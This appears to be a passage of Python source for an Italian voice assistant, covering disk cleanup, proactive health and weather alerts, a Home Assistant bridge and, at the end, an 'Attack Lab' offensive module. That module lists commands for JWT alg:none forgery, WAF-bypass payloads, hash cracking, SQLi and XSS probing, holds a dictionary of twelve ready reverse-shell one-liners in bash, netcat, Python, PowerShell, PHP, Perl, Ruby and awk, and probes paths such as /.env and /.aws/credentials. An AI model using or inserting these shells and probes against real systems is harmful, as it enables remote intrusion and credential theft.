            Path(os.environ.get("LOCALAPPDATA", "")) / "Microsoft/Windows/Explorer",
            Path(os.environ.get("APPDATA", "")) / "Microsoft/Windows/Recent",
        ]
        if IS_WINDOWS:
            prefetch = Path("C:/Windows/Prefetch")
            if prefetch.exists():
                targets.append(prefetch)
        self.SAFE_TEMP_DIRS = [p for p in targets if p and p.exists()]

    # ------------------------------------------------------------------ #

    def get_disk_usage(self) -> Dict[str, Any]:
        """Analizza utilizzo disco corrente"""
        result = {}
        try:
            if psutil:
                for part in psutil.disk_partitions(all=False):
                    try:
                        usage = psutil.disk_usage(part.mountpoint)
                        result[part.mountpoint] = {
                            "total": usage.total,
                            "used": usage.used,
                            "free": usage.free,
                            "percent": usage.percent,
                        }
                    except Exception as _e:
                        pass  # suppressed error
            else:
                usage = shutil.disk_usage(Path.home().anchor)
                result[Path.home().anchor] = {
                    "total": usage.total,
                    "used": usage.used,
                    "free": usage.free,
                    "percent": round(usage.used / usage.total * 100, 1),
                }
        except Exception as e:
            self.logger.error("DISK", f"Errore analisi disco: {e}")
        return result

    def scan_junk(self, max_age_days: int = 7) -> Dict[str, Any]:
        """Scansiona i file spazzatura senza eliminarli"""
        total_size = 0
        file_count = 0
        details: Dict[str, int] = {}
        cutoff = time.time() - max_age_days * 86400

        for d in self.SAFE_TEMP_DIRS:
            dir_size = 0
            try:
                for f in d.rglob("*"):
                    try:
                        if f.is_file() and f.stat().st_mtime < cutoff:
                            sz = f.stat().st_size
                            dir_size += sz
                            file_count += 1
                    except Exception as _e:
                        pass  # suppressed error
            except Exception as _e:
                pass  # suppressed error
            if dir_size:
                details[str(d)] = dir_size
                total_size += dir_size

        return {"total_bytes": total_size, "files": file_count, "by_dir": details}

    def clean_temp_dirs(self, max_age_days: int = 3) -> Tuple[int, int]:
        """Elimina file temp vecchi. Ritorna (file_eliminati, bytes_liberati)."""
        deleted = 0
        freed = 0
        cutoff = time.time() - max_age_days * 86400

        for d in self.SAFE_TEMP_DIRS:
            try:
                for f in d.rglob("*"):
                    try:
                        if f.is_file() and f.stat().st_mtime < cutoff:
                            sz = f.stat().st_size
                            f.unlink(missing_ok=True)
                            deleted += 1
                            freed += sz
                    except Exception as _e:
                        pass  # suppressed error
                # Prova a rimuovere directory vuote
                for sub in sorted(d.rglob("*"), key=lambda p: len(p.parts), reverse=True):
                    try:
                        if sub.is_dir():
                            sub.rmdir()
                    except Exception as _e:
                        pass  # suppressed error
            except Exception as e:
                self.logger.warning("DISK", f"Skip {d}: {e}")

        self.logger.info("DISK", f"Temp cleanup: {deleted} file, {format_bytes(freed)}")
        return deleted, freed

    def empty_recycle_bin(self) -> bool:
        """Svuota il Cestino (Windows)"""
        if not IS_WINDOWS:
            return False
        try:
            subprocess.run(
                ["powershell", "-Command", "Clear-RecycleBin -Force -ErrorAction SilentlyContinue"],
                capture_output=True, timeout=30
            )
            self.logger.info("DISK", "Cestino svuotato")
            return True
        except Exception as e:
            self.logger.error("DISK", f"Errore svuota cestino: {e}")
            return False

    def clean_old_logs(self, max_age_days: int = 14) -> Tuple[int, int]:
        """Elimina log di sistema vecchi"""
        deleted, freed = 0, 0
        log_dirs = [LOGS_DIR]
        cutoff = time.time() - max_age_days * 86400
        for d in log_dirs:
            for f in d.glob("*.log"):
                try:
                    if f.stat().st_mtime < cutoff:
                        sz = f.stat().st_size
                        f.unlink()
                        deleted += 1
                        freed += sz
                except Exception as _e:
                    pass  # suppressed error
        return deleted, freed

    def full_cleanup(self) -> Dict[str, Any]:
        """Esegue pulizia completa e ritorna report"""
        report = {}

        t_del, t_freed = self.clean_temp_dirs(max_age_days=3)
        report["temp"] = {"files": t_del, "freed": t_freed}

        l_del, l_freed = self.clean_old_logs(max_age_days=14)
        report["logs"] = {"files": l_del, "freed": l_freed}

        bin_ok = self.empty_recycle_bin()
        report["recycle_bin"] = bin_ok

        report["total_freed"] = t_freed + l_freed
        report["total_files"] = t_del + l_del
        return report

    def get_large_files(self, root: Path = None, top_n: int = 10,
                        min_size_mb: int = 100) -> List[Tuple[int, str]]:
        """Trova i file più grandi sul disco"""
        root = root or Path.home()
        min_size = min_size_mb * 1024 * 1024
        large: List[Tuple[int, str]] = []
        try:
            for f in root.rglob("*"):
                try:
                    if f.is_file():
                        sz = f.stat().st_size
                        if sz >= min_size:
                            large.append((sz, str(f)))
                except Exception as _e:
                    pass  # suppressed error
        except Exception as _e:
            pass  # suppressed error
        large.sort(reverse=True)
        return large[:top_n]

    def analyze_folder(self, path: str) -> Dict[str, Any]:
        """Analizza una cartella e ritorna statistiche"""
        p = Path(path)
        if not p.exists():
            return {"error": f"Cartella non trovata: {path}"}
        total, count = 0, 0
        by_ext: Dict[str, int] = defaultdict(int)
        for f in p.rglob("*"):
            try:
                if f.is_file():
                    sz = f.stat().st_size
                    total += sz
                    count += 1
                    by_ext[f.suffix.lower()] += sz
            except Exception as _e:
                pass  # suppressed error
        top_ext = sorted(by_ext.items(), key=lambda x: x[1], reverse=True)[:5]
        return {
            "path": str(p),
            "total_bytes": total,
            "file_count": count,
            "top_extensions": top_ext,
        }


# ==============================================================================
# PROACTIVE MONITOR — Parla da solo come Jarvis
# ==============================================================================

class ProactiveMonitor:
    """
    Thread proattivo che monitora eventi in background e avvisa l'utente
    senza che lui debba chiedere:
    - Meteo mattutino e alert pioggia
    - Promemoria in scadenza
    - CPU/RAM/Disco critici
    - Battery bassa (laptop)
    - Aggiornamenti notizie
    - Briefing mattutino giornaliero
    """

    CHECK_INTERVALS = {
        "system_health": 60,       # ogni minuto
        "battery":       120,      # ogni 2 minuti
        "reminders":     30,       # ogni 30 secondi
        "weather":       1800,     # ogni 30 minuti
        "morning_brief": 3600,     # ogni ora (ma si attiva solo una volta al giorno)
    }

    def __init__(self, state: "StateManager", memory: "MemoryManager",
                 db: "DatabaseManager", tts: "VoiceSynthesizer",
                 ai: "ClaudeAIClient", logger: "StructuredLogger",
                 event_bus: "EventBus"):
        self.state = state
        self.memory = memory
        self.db = db
        self.tts = tts
        self.ai = ai
        self.logger = logger
        self.event_bus = event_bus

        self._running = False
        self._thread: Optional[threading.Thread] = None
        self._last_check: Dict[str, float] = {k: 0.0 for k in self.CHECK_INTERVALS}
        self._briefing_done_today: Optional[str] = None  # data YYYY-MM-DD

        # Soglie alert
        self._cpu_alert_threshold = 90      # %
        self._ram_alert_threshold = 90      # %
        self._disk_alert_threshold = 90     # %
        self._battery_alert_threshold = 15  # %
        self._last_cpu_alert = 0.0
        self._last_battery_alert = 0.0

    def start(self):
        self._running = True
        self._thread = threading.Thread(
            target=self._loop, daemon=True, name="ProactiveMonitor"
        )
        self._thread.start()
        self.logger.info("PROACTIVE", "Monitor proattivo avviato")

    def stop(self):
        self._running = False

    # ------------------------------------------------------------------ #

    def _loop(self):
        time.sleep(10)  # Attendi l'avvio completo
        while self._running:
            now = time.time()
            for check_name, interval in self.CHECK_INTERVALS.items():
                if now - self._last_check[check_name] >= interval:
                    self._last_check[check_name] = now
                    try:
                        getattr(self, f"_check_{check_name}")()
                    except Exception as e:
                        self.logger.debug("PROACTIVE", f"{check_name} error: {e}")
            time.sleep(5)

    # Soglie minime per parlare (più alte = meno rumore vocale)
    _SPEAK_CPU_THRESH   = 93   # parla solo se CPU > 93%
    _SPEAK_RAM_THRESH   = 92   # parla solo se RAM > 92%
    _SPEAK_DISK_THRESH  = 92   # parla solo se DISK > 92%
    _SPEAK_BATT_THRESH  = 10   # parla solo se batteria < 10%
    _SPEAK_RAIN_MM      = 5.0  # parla solo se pioggia > 5mm
    _ALERT_COOLDOWN     = 600  # secondi tra due alert dello stesso tipo

    def _notify(self, msg: str, level: str = "info", speak: bool = False):
        """Invia notifica in-UI via EventBus e, se importante, parla."""
        self.event_bus.emit("proactive.alert",
                            data={"message": msg, "level": level},
                            source="ProactiveMonitor")
        self.logger.info("PROACTIVE", f"[{level.upper()}] {msg[:80]}")
        if speak:
            sys_state = self.state.get("system_state")
            if sys_state not in (SystemState.SPEAKING, SystemState.PROCESSING):
                self.tts.speak(msg)

    # ── CHECKS ────────────────────────────────────────────────────────── #

    def _check_system_health(self):
        if not psutil:
            return
        now = time.time()
        cpu  = psutil.cpu_percent(interval=1)
        ram  = psutil.virtual_memory().percent
        try:
            disk = (psutil.disk_usage("C:/").percent if IS_WINDOWS
                    else psutil.disk_usage("/").percent)
        except Exception:
            disk = 0.0

        # Aggiorna HUD sempre (silenzioso)
        self.state.set("cpu_percent",  cpu,  notify=False)
        self.state.set("ram_percent",  ram,  notify=False)
        self.state.set("disk_percent", disk, notify=False)

        # CPU critica → parla + notifica
        if cpu > self._SPEAK_CPU_THRESH and now - self._last_cpu_alert > self._ALERT_COOLDOWN:
            self._last_cpu_alert = now
            self._notify(f"CPU al {cpu:.0f}% — sistema sotto stress", "danger", speak=True)

        # RAM critica → notifica UI senza parlare (meno invasivo)
        elif ram > self._SPEAK_RAM_THRESH:
            self._notify(f"RAM al {ram:.0f}% — considera di chiudere app", "warning", speak=False)

        # RAM alta ma non critica → solo HUD, nessun suono
        elif ram > 80:
            self._notify(f"RAM al {ram:.0f}%", "info", speak=False)

        # Disco critico → parla (rischio perdita dati)
        if disk > self._SPEAK_DISK_THRESH and now - getattr(self, "_last_disk_alert", 0) > self._ALERT_COOLDOWN:
            self._last_disk_alert = now
            self._notify(f"Disco al {disk:.0f}% — liberare spazio urgente", "danger", speak=True)

    def _check_battery(self):
        if not psutil:
            return
        try:
            batt = psutil.sensors_battery()
            if batt is None:
                return
            now = time.time()
            pct     = batt.percent
            plugged = batt.power_plugged
            self.state.set("battery_percent", pct,     notify=False)
            self.state.set("battery_plugged",  plugged, notify=False)

            if not plugged:
                if pct <= self._SPEAK_BATT_THRESH and now - self._last_battery_alert > self._ALERT_COOLDOWN:
                    # Critica: parla
                    self._last_battery_alert = now
                    self._notify(f"Batteria al {pct:.0f}% — collegare il caricatore", "danger", speak=True)
                elif pct <= 20 and now - self._last_battery_alert > self._ALERT_COOLDOWN * 2:
                    # Bassa ma non critica: solo notifica visiva
                    self._notify(f"Batteria al {pct:.0f}%", "warning", speak=False)
        except Exception as _e:
            pass  # suppressed error

    def _check_reminders(self):
        """Promemoria: parla sempre (l'utente li ha impostati apposta)"""
        try:
            due = self.db.get_upcoming_reminders(hours=0, minutes_ahead=2)
            for rem in due:
                title = rem.get("title", "Promemoria")
                user = self.memory.get_user_name()
                self._notify(f"Hey {user}, promemoria: {title}", "warning", speak=True)
                try:
                    self.db.mark_reminder_notified(rem.get("id"))
                except Exception as _e:
                    pass  # suppressed error
        except Exception as _e:
            pass  # suppressed error

    def _check_weather(self):
        """Meteo: aggiorna HUD sempre, parla SOLO per pioggia intensa."""
        try:
            if not requests:
                return
            city = self.memory.get("profilo.citta", "Roma")
            url  = f"https://wttr.in/{urllib.parse.quote(city)}?format=j1"
            resp = requests.get(url, timeout=8)
            if resp.status_code != 200:
                return
            data    = resp.json()
            current = data["current_condition"][0]
            temp_c  = current.get("temp_C", "?")
            desc    = current.get("weatherDesc", [{}])[0].get("value", "")
            rain_mm = float(current.get("precipMM", 0) or 0)

            # Aggiorna HUD (sempre silenzioso)
            self.state.set("weather", {"temp": temp_c, "desc": desc, "rain_mm": rain_mm}, notify=False)

            now = time.time()
            last_rain = getattr(self, "_last_rain_alert", 0)
            if rain_mm > self._SPEAK_RAIN_MM and now - last_rain > 3600:
                self._last_rain_alert = now
                self._notify(
                    f"Pioggia intensa prevista: {rain_mm:.1f}mm — ricorda l'ombrello",
                    "warning", speak=True
                )
            elif rain_mm > 1.0:
                # Pioggia leggera: solo notifica visiva
                self._notify(f"Meteo: {desc}, {temp_c}°C, pioggia {rain_mm:.1f}mm", "info", speak=False)
        except Exception as _e:
            pass  # suppressed error

    def _check_morning_brief(self):
        """Briefing mattutino una sola volta al giorno tra le 7:30 e le 10:00"""
        now = datetime.now()
        today_str = now.strftime("%Y-%m-%d")
        if self._briefing_done_today == today_str:
            return
        if not (7 <= now.hour < 10):
            return

        self._briefing_done_today = today_str
        self._deliver_morning_brief()

    def _deliver_morning_brief(self):
        """Componi e parla il briefing mattutino"""
        user = self.memory.get_user_name()
        now = datetime.now()
        weekday = ["lunedì","martedì","mercoledì","giovedì","venerdì","sabato","domenica"][now.weekday()]

        parts = [f"Buongiorno {user}. Sono le {now.strftime('%H:%M')} di {weekday}."]

        # Promemoria di oggi
        try:
            due_today = self.db.get_upcoming_reminders(hours=24)
            if due_today:
                parts.append(f"Ha {len(due_today)} promemori oggi.")
        except Exception as _e:
            pass  # suppressed error

        # Meteo
        weather = self.state.get("weather")
        if weather:
            parts.append(
                f"Meteo: {weather.get('desc','')}, {weather.get('temp','?')} gradi."
            )

        # Stats ieri
        cmds_yesterday = self.memory.get("statistiche.comandi_totali", 0)
        if cmds_yesterday:
            parts.append(f"Sessioni precedenti: {cmds_yesterday} comandi totali registrati.")

        parts.append("Sono operativo e pronto ai suoi ordini.")
        self._speak_proactive(" ".join(parts))


# ==============================================================================
# HOME ASSISTANT BRIDGE — Controllo smart home
# ==============================================================================

class HomeAssistantBridge:
    """
    Integrazione con Home Assistant via REST API.
    Configurare HA_URL e HA_TOKEN nelle variabili d'ambiente o nel config.
    Permette di: accendere/spegnere luci, controllare termostato,
    leggere sensori, eseguire script/scene.
    """

    def __init__(self, logger: "StructuredLogger", config: "ConfigurationManager"):
        self.logger = logger
        self.config = config
        self._base_url = (
            os.environ.get("HA_URL") or
            config.get("home_assistant.url", "")
        ).rstrip("/")
        self._token = (
            os.environ.get("HA_TOKEN") or
            config.get("home_assistant.token", "")
        )
        self._available = bool(self._base_url and self._token and requests)

    def is_available(self) -> bool:
        return self._available

    def _headers(self) -> Dict[str, str]:
        return {
            "Authorization": f"Bearer {self._token}",
            "Content-Type": "application/json",
        }

    def _get(self, path: str) -> Optional[Any]:
        if not self._available:
            return None
        try:
            r = requests.get(f"{self._base_url}/api/{path}",
                             headers=self._headers(), timeout=5)
            r.raise_for_status()
            return r.json()
        except Exception as e:
            self.logger.warning("HA", f"GET {path} error: {e}")
            return None

    def _post(self, path: str, data: Dict = None) -> Optional[Any]:
        if not self._available:
            return None
        try:
            r = requests.post(f"{self._base_url}/api/{path}",
                              headers=self._headers(),
                              json=data or {}, timeout=5)
            r.raise_for_status()
            return r.json()
        except Exception as e:
            self.logger.warning("HA", f"POST {path} error: {e}")
            return None

    # ── AZIONI ────────────────────────────────────────────────────────── #

    def call_service(self, domain: str, service: str,
                     entity_id: str = None, **kwargs) -> bool:
        data = kwargs
        if entity_id:
            data["entity_id"] = entity_id
        result = self._post(f"services/{domain}/{service}", data)
        return result is not None

    def turn_on(self, entity_id: str, **kwargs) -> bool:
        return self.call_service("homeassistant", "turn_on", entity_id, **kwargs)

    def turn_off(self, entity_id: str) -> bool:
        return self.call_service("homeassistant", "turn_off", entity_id)

    def toggle(self, entity_id: str) -> bool:
        return self.call_service("homeassistant", "toggle", entity_id)

    def get_state(self, entity_id: str) -> Optional[Dict]:
        return self._get(f"states/{entity_id}")

    def get_all_states(self) -> List[Dict]:
        return self._get("states") or []

    def set_light_brightness(self, entity_id: str, brightness_pct: int) -> bool:
        brightness = max(0, min(255, int(brightness_pct * 255 / 100)))
        return self.call_service("light", "turn_on", entity_id, brightness=brightness)

    def set_light_color(self, entity_id: str, r: int, g: int, b: int) -> bool:
        return self.call_service("light", "turn_on", entity_id, rgb_color=[r, g, b])

    def set_temperature(self, entity_id: str, temp: float) -> bool:
        return self.call_service("climate", "set_temperature", entity_id,
                                 temperature=temp)

    def run_scene(self, scene_id: str) -> bool:
        return self.call_service("scene", "turn_on", f"scene.{scene_id}")

    def run_script(self, script_id: str) -> bool:
        return self.call_service("script", "turn_on", f"script.{script_id}")

    def get_entities_by_domain(self, domain: str) -> List[str]:
        states = self.get_all_states()
        return [s["entity_id"] for s in states
                if s.get("entity_id", "").startswith(domain + ".")]

    def summary(self) -> str:
        """Restituisce uno stato riassuntivo della casa"""
        if not self._available:
            return "Home Assistant non configurato. Imposta HA_URL e HA_TOKEN."
        states = self.get_all_states()
        if states is None:
            return "Impossibile raggiungere Home Assistant."
        lights_on = [s["entity_id"] for s in states
                     if s.get("entity_id", "").startswith("light.")
                     and s.get("state") == "on"]
        sensors = {s["entity_id"]: s.get("state")
                   for s in states if s.get("entity_id", "").startswith("sensor.")}
        temp_sensors = {k: v for k, v in sensors.items() if "temp" in k}
        parts = [f"Luci accese: {len(lights_on)}."]
        if temp_sensors:
            for k, v in list(temp_sensors.items())[:2]:
                name = k.split(".")[-1].replace("_", " ")
                parts.append(f"{name}: {v}°.")
        return " ".join(parts)


# ==============================================================================
# ATTACK LAB — cockpit offensivo (recon web, payload anti-WAF, JWT, CVE intel)
# ==============================================================================

# Catalogo comandi hacking, messo in evidenza a schermo (come i comandi vocali).
VOICE_HACK_COMMANDS: Dict[str, List[str]] = {
    "Recon di rete": [
        "recon completo <host>      (scan porte async + banner + auto-CVE)",
        "scansione veloce <host>",
    ],
    "Recon web": [
        "web recon <url>            (grado header + fingerprint + path sensibili)",
        "analizza sito <url>",
    ],
    "Payload lab (anti-WAF/filtri)": [
        "codifica payload <testo>   (base64/url/hex/unicode/case + mutazioni)",
        "bypass waf <testo>",
    ],
    "JWT lab": [
        "decodifica jwt <token>     (header/payload + alg debole)",
        "forgia jwt <token>         (riscrive alg:none, firma vuota)",
    ],
    "Cred lab": [
        "cracka hash <hash> [con <wordlist>]   (dizionario + mutazioni)",
        "mutazioni password <parola>           (wordlist mirata OSINT)",
    ],
    "Web-attack": [
        "web attack <url>           (dirbust + SQLi + XSS + form crawler)",
        "dirbust <url>              (scoperta path comuni)",
        "test sqli <url?p=1>        (SQLi reflected non distruttivo)",
        "test xss <url?q=x>         (XSS reflected con marker)",
        "crawl form <url>           (estrae action/method/campi)",
    ],
    "C2 / payload forge": [
        "forgia shell <lhost> <lport> [flavor|tutti]  (11 flavor multi-piattaforma)",
        "avvia listener <porta>     (cattura la reverse shell in ingresso)",
        "stato listener            (peer connesso + output ricevuto)",
        "encoda comando <cmd>       (powershell -enc / base64 / url / hex / python)",
    ],
    "Report": [
        "report attacco            (esporta i finding di sessione in HTML)",
        "esporta findings",
    ],
    "CVE intel": [
        "cerca cve <parola/servizio>",
    ],
}


def render_hack_catalog(color: bool = False) -> str:
    C1 = "\033[1;91m" if color else ""
    C2 = "\033[0;91m" if color else ""
    CD = "\033[2;37m" if color else ""
    R = "\033[0m" if color else ""
    lines = [f"{C1}[#] COMANDI HACKING — ATTACK LAB{R}"]
    for group, cmds in VOICE_HACK_COMMANDS.items():
        lines.append(f"{C2}== {group}{R}")
        for c in cmds:
            lines.append(f"{CD}  >{R} {c}")
    return "\n".join(lines)


class AttackLab:
    """
    Cockpit offensivo per red-team autorizzato. Capacità che FRANCO non aveva:
      - recon web: grading degli header di sicurezza, fingerprint tecnologico,
        probe di path sensibili, CORS e clickjacking
      - payload lab: codifiche + mutazioni per test di bypass filtri/WAF
      - JWT lab: decode header/payload, flag alg debole, forge alg:none
      - CVE intel: interroga il feed NVD per vulnerabilità note

    Tutto degrada in modo pulito se `requests` non è disponibile.
    """

    _SECURITY_HEADERS = (
        "content-security-policy", "strict-transport-security", "x-frame-options",
        "x-content-type-options", "referrer-policy", "permissions-policy",
    )
    _SENSITIVE_PATHS = (
        "/.git/HEAD", "/.env", "/.env.local", "/config.php.bak", "/backup.zip",
        "/.aws/credentials", "/wp-config.php.bak", "/admin", "/server-status",
        "/actuator/env", "/api/swagger.json", "/phpinfo.php", "/.DS_Store",
    )

    def __init__(self, logger, config=None, event_bus=None):
        self.logger = logger
        self.config = config
        self.event_bus = event_bus

    # ---------- routing ----------
    _TRIGGERS = (
        "web recon", "analizza sito", "scansiona sito", "codifica payload",
        "genera payload", "bypass waf", "decodifica jwt", "analizza jwt",
        "forgia jwt", "jwt none", "cerca cve", "vulnerabilita note",
        "vulnerabilità note", "comandi hacking", "comandi offensivi", "attack lab",
        "recon completo", "scansione veloce", "scan veloce", "scansione porte",
        "porte aperte",
        "cracka hash", "crack hash", "decifra hash", "bruteforce hash",
        "mutazioni password", "genera wordlist",
        "web attack", "scansione web", "dirbust", "test sqli", "test xss",
        "crawl form", "analizza form",
        "forgia shell", "revshell", "reverse shell", "genera shell",
        "stato listener", "avvia listener", "listener", "ascoltatore",
        "encoda comando", "encoda payload", "offusca comando", "powershell enc",
        "report attacco", "report offensivo", "genera report offensivo",
        "esporta findings", "esporta finding",
    )

    # reverse-shell one-liner multi-piattaforma ({ip}/{port})
    _RSHELLS = {
        "bash": "bash -i >& /dev/tcp/{ip}/{port} 0>&1",
        "bash-udp": "sh -i >& /dev/udp/{ip}/{port} 0>&1",
        "sh-mkfifo": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {ip} {port} >/tmp/f",
        "nc": "nc {ip} {port} -e /bin/sh",
        "nc-mkfifo": "rm -f /tmp/p;mknod /tmp/p p;/bin/sh 0</tmp/p|nc {ip} {port} 1>/tmp/p",
        "python": "python -c 'import socket,os,pty;s=socket.socket();s.connect((\"{ip}\",{port}));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn(\"/bin/sh\")'",
        "python3": "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{ip}\",{port}));[os.dup2(s.fileno(),f) for f in(0,1,2)];subprocess.call([\"/bin/sh\",\"-i\"])'",
        "powershell": "powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('{ip}',{port});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sy=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sy,0,$sy.Length);$s.Flush()}}\"",
        "php": "php -r '$s=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        "perl": "perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'",
        "ruby": "ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
        "awk": "awk 'BEGIN{{s=\"/inet/tcp/0/{ip}/{port}\";while(1){{do{{printf \"shell>\" |& s;s |& getline c;if(c){{while((c |& getline) > 0)print $0 |& s;close(c)}}}}while(c!=\"exit\")close(s)}}}}'",
    }

    # dirbust: path comuni da scoprire
    _DIRBUST_PATHS = (
        "admin", "administrator", "login", "logout", "dashboard", "panel",
        "api", "api/v1", "api/v2", "graphql", "swagger", "swagger-ui.html",
        "actuator", "actuator/health", "actuator/env", "config", "config.json",
        "backup", "backup.zip", "db", "database", "uploads", "files", "tmp",
        "test", "dev", "staging", "phpinfo.php", "phpmyadmin", "wp-admin",
        "wp-login.php", "wp-json", "robots.txt", "sitemap.xml", ".git/HEAD",
        ".env", ".htaccess", "server-status", "console", "debug", "status",
        "metrics", "health", "user", "users", "account", "settings",
    )
    # firme di errore SQL (SQLi reflected)
    _SQL_ERRORS = (
        "you have an error in your sql syntax", "warning: mysql",
        "unclosed quotation mark", "quoted string not properly terminated",
        "pg_query", "postgresql", "sqlite_", "sqlite3::", "ora-0", "ora-01",
        "syntax error at or near", "mysql_fetch", "mysqli", "odbc sql server",
        "microsoft ole db", "sqlstate", "native client",
    )

    # wordlist minima integrata (top password reali) — base per le mutazioni
    _COMMON_WORDS = (
        "password", "123456", "123456789", "qwerty", "admin", "letmein",
        "welcome", "monkey", "dragon", "master", "login", "abc123", "iloveyou",
        "sunshine", "princess", "football", "root", "toor", "pass", "secret",
        "hello", "test", "guest", "changeme", "ninja", "azerty", "superman",
        "batman", "trustno1", "whatever", "shadow", "michael", "jordan",
    )

    # top port -> servizio atteso (per fingerprint e auto-CVE)
    _TOP_PORTS = {
        21: "ftp", 22: "ssh", 23: "telnet", 25: "smtp", 53: "dns", 80: "http",
        110: "pop3", 111: "rpcbind", 135: "msrpc", 139: "netbios", 143: "imap",
        443: "https", 445: "smb", 993: "imaps", 995: "pop3s", 1433: "mssql",
        1521: "oracle", 2049: "nfs", 3306: "mysql", 3389: "rdp", 5432: "postgres",
        5900: "vnc", 6379: "redis", 8080: "http-alt", 8443: "https-alt",
        9200: "elasticsearch", 27017: "mongodb",
    }

    def should_handle(self, text: str) -> bool:
        t = text.lower()
        return any(k in t for k in self._TRIGGERS)

    def handle(self, text: str) -> str:
        t = text.lower().strip()
        try:
            if any(k in t for k in ("comandi hacking", "comandi offensivi", "attack lab")):
                return render_hack_catalog(color=False)
            if any(k in t for k in ("report attacco", "report offensivo",
                                    "genera report offensivo", "esporta findings",
                                    "esporta finding")):
                return self.report_html()
            if t.startswith(("recon completo", "scansione veloce", "scan veloce",
                             "scansione porte", "porte aperte")):
                return self.full_recon(self._arg(text, (
                    "recon completo", "scansione veloce", "scan veloce",
                    "scansione porte", "porte aperte")))
            if t.startswith(("cracka hash", "crack hash", "decifra hash", "bruteforce hash")):
                return self.crack_hash(self._arg(text, (
                    "cracka hash", "crack hash", "decifra hash", "bruteforce hash")))
            if t.startswith(("mutazioni password", "genera wordlist")):
                return self.password_mutations(self._arg(text, ("mutazioni password", "genera wordlist")))
            if t.startswith(("web attack", "scansione web")):
                return self.web_attack(self._arg(text, ("web attack", "scansione web")))
            if t.startswith("dirbust"):
                return self.dirbust(self._arg(text, ("dirbust",)))
            if t.startswith("test sqli"):
                return self.probe_sqli(self._arg(text, ("test sqli",)))
            if t.startswith("test xss"):
                return self.probe_xss(self._arg(text, ("test xss",)))
            if t.startswith(("crawl form", "analizza form")):
                return self.crawl_forms(self._arg(text, ("crawl form", "analizza form")))
            if t.startswith(("forgia shell", "revshell", "reverse shell", "genera shell")):
                return self.revshell(self._arg(text, ("forgia shell", "revshell", "reverse shell", "genera shell")))
            if t.startswith("stato listener"):
                return self.listener_status()
            if t.startswith(("avvia listener", "listener", "ascoltatore")):
                return self.start_listener(self._arg(text, ("avvia listener", "ascoltatore", "listener")))
            if t.startswith(("encoda comando", "encoda payload", "offusca comando", "powershell enc")):
                return self.encode_oneliner(self._arg(text, ("encoda comando", "encoda payload", "offusca comando", "powershell enc")))
            if t.startswith(("web recon", "analizza sito", "scansiona sito")):
                return self.web_recon(self._arg(text, ("web recon", "analizza sito", "scansiona sito")))
            if t.startswith(("codifica payload", "genera payload", "bypass waf")):
                return self.encode_payloads(self._arg(text, ("codifica payload", "genera payload", "bypass waf")))
            if t.startswith("forgia jwt") or "jwt none" in t:
                return self.jwt_forge_none(self._arg(text, ("forgia jwt", "jwt none")))
            if t.startswith(("decodifica jwt", "analizza jwt")):
                return self.jwt_decode(self._arg(text, ("decodifica jwt", "analizza jwt")))
            if t.startswith(("cerca cve", "vulnerabilita note", "vulnerabilità note")):
                return self.cve_lookup(self._arg(text, ("cerca cve", "vulnerabilita note", "vulnerabilità note")))
        except Exception as e:
            self.logger.error("ATTACK", f"comando fallito: {e}")
            return f"Attack Lab: errore nell'esecuzione ({e})."
        return "Comando offensivo non riconosciuto. Di' 'comandi hacking'."

    @staticmethod
    def _arg(text: str, prefixes) -> str:
        low = text.lower()
        for p in sorted(prefixes, key=len, reverse=True):
            i = low.find(p)
            if i != -1:
                return text[i + len(p):].strip()
        return text.strip()

    # ---------- recon web ----------
    def web_recon(self, url: str) -> str:
        if not url:
            return "Dammi un URL: 'web recon https://esempio.com'."
        if not url.startswith(("http://", "https://")):
            url = "https://" + url
        if requests is None:
            return "Modulo requests non disponibile per il recon web."
        out = [f"RECON WEB — {url}"]
        try:
            r = requests.get(url, timeout=10, allow_redirects=True,
                             headers={"User-Agent": "FRANCO-AttackLab/1.0"}, verify=True)
        except Exception as e:
            return f"Sito non raggiungibile: {e}"
        h = {k.lower(): v for k, v in r.headers.items()}

        # grado header di sicurezza
        missing = [x for x in self._SECURITY_HEADERS if x not in h]
        present = len(self._SECURITY_HEADERS) - len(missing)
        grade = ["A", "A", "B", "C", "D", "E", "F"][min(len(missing), 6)]
        out.append(f"Header sicurezza: {present}/{len(self._SECURITY_HEADERS)} presenti -> grado {grade}")
        if missing:
            out.append("  Mancanti: " + ", ".join(missing))

        # fingerprint
        fp = []
        for k in ("server", "x-powered-by", "x-aspnet-version", "x-generator", "via"):
            if k in h:
                fp.append(f"{k}={h[k]}")
        gen = re.search(r'<meta[^>]+name=["\']generator["\'][^>]+content=["\']([^"\']+)', r.text[:5000], re.I)
        if gen:
            fp.append(f"generator={gen.group(1)}")
        out.append("Fingerprint: " + (", ".join(fp) if fp else "nessun header rivelatore"))

        # cookie flags
        raw_cookies = r.headers.get("set-cookie", "")
        if raw_cookies:
            flags = []
            if "httponly" not in raw_cookies.lower():
                flags.append("manca HttpOnly")
            if "secure" not in raw_cookies.lower():
                flags.append("manca Secure")
            if "samesite" not in raw_cookies.lower():
                flags.append("manca SameSite")
            out.append("Cookie: " + (", ".join(flags) if flags else "flag ok"))

        # clickjacking
        if "x-frame-options" not in h and "frame-ancestors" not in h.get("content-security-policy", "").lower():
            out.append("Clickjacking: POSSIBILE (nessun X-Frame-Options / frame-ancestors)")

        # CORS misconfig
        try:
            rc = requests.get(url, timeout=8, headers={"Origin": "https://evil.example",
                                                       "User-Agent": "FRANCO-AttackLab/1.0"})
            acao = rc.headers.get("access-control-allow-origin", "")
            acac = rc.headers.get("access-control-allow-credentials", "")
            if acao in ("*", "https://evil.example"):
